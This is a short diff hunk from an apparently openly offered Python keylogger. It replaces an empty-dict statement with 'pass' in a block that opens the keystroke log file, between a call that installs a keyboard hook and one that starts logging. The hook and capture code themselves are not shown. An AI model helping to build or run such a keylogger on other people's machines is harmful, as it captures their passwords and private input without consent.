@@ -164,6 +164,6 @@ if keyLogger.installHookProc(pointer):
     print("installed keyLogger")
 
 with open(LOG_FILE_LOCATION, 'w') as log:
-    {}
+    pass
 
 startKeyLog()
